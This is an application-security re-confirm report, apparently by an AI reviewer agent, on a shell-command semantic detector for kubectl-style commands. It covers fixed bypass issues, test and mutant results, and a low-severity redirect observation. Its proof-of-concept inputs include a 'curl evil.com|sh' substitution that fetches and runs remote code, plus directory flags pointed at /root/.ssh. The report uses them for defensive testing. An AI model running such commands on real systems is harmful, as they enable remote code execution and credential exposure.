# S4 — Shell-command semantic detector: app-security-reviewer re-confirm pass

**Scope:** re-verification of story-implementer's fix-now round closing Issue #68 (my Finding 1, HIGH) and Issue #69 (my Finding 2, MED) from docs/reviews/s4-shell-semantic-detector-app-security-2026-09-02.md, folded together with red-team's Issue #70-#74 and architecture-reviewer's Issue #77. Per the coordinator's instruction, every claim below was independently re-run against the live fixed code, not trusted from the summary. A quick bypass-hunt pass was also run against the new logic introduced in this round (collectResources, extractRedirectTargets, findLiveTrailingSensitiveSeparator, the scanFlags redirect-skip branch, and the module-internal depth parameter).

## What I ran myself

npm test:
```
tests 377
pass 377
fail 0
skipped 0
```
377/377 passing, 0 skipped, up from 336 at my prior pass (41 new tests) — non-vacuous.

node src/qa/shell-detector-mutants.ts (LF-normalized copy, same CRLF-checkout workaround as my prior pass — this is still Finding 3 from the prior report, unaffected by this round, not re-claimed as fixed here):
```
[QA-06 shell-detector-mutants] PASS: 40 of 40 mutant(s) KILLED.
```
40/40 KILLED, up from 28 — 12 new named mutant classes registered for this round's new branches (unterminated-quote check, trailing-sensitive-separator newline/ampersand/trailing-guard, heredoc herestring exclusion, redirect-operator-exclusion-from-positional, multi-resource collection, multi-redirect collection, and the resource-token-count regression re-verified under multi-resource composition).

## Re-verification of my two original findings

### Issue #68 (Finding 1, HIGH) — CONFIRMED FIXED

Re-ran my exact original PoC and its control against the live fixed shell.ts:
```
input:  kubectl get pod/foo --context='prod $(curl evil.com|sh)
record: unresolved: [unterminated quote - cannot confidently classify the rest of the command]
```

Now correctly denies (non-empty unresolved), instead of the prior clean/resolved record. Also checked three adjacent shapes not in my original PoC:
- Double-quote unterminated variant: now also caught (previously already safe, still safe).
- A bare unterminated quote with no live payload at all (context flag value is just an opening quote, nothing after): also caught, confirming the check fires on the quote itself, not just on a payload happening to follow it.
- The control case (same payload, quote properly closed) still correctly denies via the original two checks (chain operator plus substitution), unchanged.

Code-level: shell-scanner.ts's walkQuoteState is now the single source of truth for both the per-character state array (quoteStates) and a final end-of-walk state; hasUnterminatedQuote checks final not equal to none (not the per-character array, which the code's own comment notes is a distinct, easy-to-get-wrong signal for a quote closed by the very last character of the string - a real, well-caught subtlety). collectSyntaxUnresolved in shell.ts checks this FIRST, unconditionally, before any other syntax check, and returns immediately. This matches the fix description and closes the gap as demonstrated.

### Issue #69 (Finding 2, MED) — CONFIRMED FIXED

Re-ran my exact original PoC plus the alias-collision case red-team found:
```
kubectl delete pod/foo -d=/root/.ssh --context=prod
result: unresolved: [directory flag present]   (was: unresolved: [] - clean bypass)

kubectl delete pod/foo -C=/root/.ssh --context=prod
result: unresolved: [directory flag present]   (alias-collision closed: -C= no longer
   silently resolves to the context/cluster field via resolveFlagAlias)

kubectl delete pod/foo --directory /root/.ssh --context=prod    (4th spelling, space-separated long form)
result: unresolved: [directory flag present]

baseline (no directory flag at all)
result: unresolved: [], clean - confirms the fix is presence-detection, not an over-broad false-positive
```
matchDirectoryFlagToken (flag-catalog.ts:59-82) now covers all 4 ordinary spellings and is checked BEFORE the generic short-flag/alias branch in scanFlags, so a directory flag can no longer reach resolveFlagAlias at all - closing both the invisibility gap and the alias-collision red-team found as one consequence of the same fix, matching the file's own header comment. Confirmed fixed, not just claimed.

## Bypass-hunt pass on the new logic

Scope: collectResources, extractRedirectTargets, findLiveTrailingSensitiveSeparator, the scanFlags redirect-skip branch, and the module-internal depth parameter. No new HIGH/MED finding. One LOW/SUSPICION worth naming, not gating.

SUSPICION LOW: scanFlags's redirect-operator recognition (shell.ts:146, an exact match against the token ">" or ">>") only matches the operator as its OWN token - an attached-without-space redirect (e.g. ">target", no space) does not match this exact-token check and falls through to positional instead of being skipped. extractRedirectTargets (shell-scanner.ts, regex-based on raw text, independent of tokenization) still correctly finds the real target either way, so the write is never hidden - verbs still gets "write" and targets still gets the real destination in every case I tried. The only observed effect is cosmetic: when the attached target also happens to parse as a syntactically-valid two-segment type/name shape (e.g. ">a/b"), it is ALSO collected as a fabricated, meaningless extra resource in collectResources, appearing as noise alongside the real target in an otherwise-clean record.

Demonstrated:
```
input:  kubectl get pod/foo --context=prod >a/b
record: verbs: [get, write]
        targets: [prod-env/cluster/prod/pod/foo, prod-env/cluster/prod/>a/b, a/b]
        unresolved: []
```

Traced through kernel.ts's matchesTarget/matchRules (OR-across-targets, deny-beats-allow) and could not construct a path where this extra fabricated target causes a real mutating action to escape a deny rule that would otherwise have matched, or where it prevents the real write from being visible - it can only ever ADD a match, never remove one, and an unrelated garbage string is not something an attacker can usefully aim at a specific allow-rule's target pattern beyond what they could already do by choosing their real filename. Recommend, non-blocking: make scanFlags's redirect-skip check regex-based (matching a leading ">" or ">>" rather than requiring an exact standalone token) so an attached-form redirect operator is recognized and excluded from positional the same way the spaced form already is, for consistency and to avoid the cosmetic-pollution record shape - not because it currently enables a bypass.

No other new gap found in collectResources (the "any malformed resource poisons the whole call" behavior holds for the multi-resource case, confirmed by the multi-resource-collection-disabled and resource-token-segment-count-check-broken mutants both being KILLED), extractRedirectTargets (multiple live redirects all collected, confirmed by the multi-redirect-collection-disabled mutant being KILLED), or findLiveTrailingSensitiveSeparator (bare newline / single ampersand correctly flagged only when non-trailing; the trailing/backgrounding exemption does not create a bypass since a bare trailing ampersand with no nohup wrapper is not itself claimed resolvable as background execution by this component - it simply is not matched by any wrapper-catalog entry, same as any other unrecognized shape).

The module-internal depth parameter (architecture-reviewer's Issue #77 fix) is confirmed: normalizeAtDepth is not exported; normalizeShellCall is the only export and always starts at depth 0 (shell.ts:373-377) - a caller can no longer pass an arbitrary starting depth to approach the cap from an elevated value.

## Verdict

APPROVE. Both my original findings (Issue #68 HIGH, Issue #69 MED) are confirmed fixed by independent re-run against the live code, not by trusting the summary. No new HIGH/MED found in this round's new logic. One non-blocking LOW/SUSPICION noted above (cosmetic target-pollution on an attached-form redirect, not exploitable). Finding 3 from my prior report (CRLF-fragile mutant anchors, LOW, QA tooling only) remains open and unaffected by this round - still non-blocking.

## Issues closed this pass

- Issue #68 (HIGH) - closed, fix confirmed by independent re-run.
- Issue #69 (MED) - closed, fix confirmed by independent re-run.

RECEIPT: verdict=APPROVE
findings (ALL of them, one terse line each, ranked by exploitability x impact):
1. [CLEAN][demonstrated] Issue #68 (unterminated single-quote defeats chain-op + substitution detection) confirmed fixed by independent re-run of the original PoC plus 3 adjacent shapes.
2. [CLEAN][demonstrated] Issue #69 (directory-flag short-equals-form silently invisible + alias collision) confirmed fixed by independent re-run of the original PoC plus the alias-collision case.
3. [SUSPICION][LOW][demonstrated] src/policy/normalizer/shell.ts:146 (scanFlags redirect-skip) - attached-form (no-space) redirect operator not recognized by the exact-token check, causing cosmetic fabricated-resource pollution in an otherwise-clean record when the attached target happens to parse as a 2-segment resource shape; traced and could not construct an exploitable path (verbs/targets always still carry the real write). Non-blocking hardening recommendation only.
4. [CLEAN][demonstrated] 377/377 tests pass, 0 skipped, non-vacuous (up from 336).
5. [CLEAN][demonstrated] 40/40 mutants KILLED on an LF-normalized copy (up from 28; same CRLF-checkout caveat as prior pass, unaffected by this round).
6. [CLEAN][code-traced] module-internal depth parameter (architecture-reviewer Issue #77) confirmed: normalizeAtDepth not exported, normalizeShellCall always starts at depth 0.
counts (a CHECKSUM - MUST equal the lines listed above; never truncated): issues=0 suspicions=1 clean=5
evidence (a CHECKSUM over the tags above - MUST equal them, and MUST total the counts line): demonstrated=5 code-traced=1 derived=0
checks="377/0/0|40/40 mutants KILLED (LF-normalized copy)"
adr=HIT(1)
report=docs/reviews/s4-shell-semantic-detector-app-security-reconfirm-2026-09-03.md
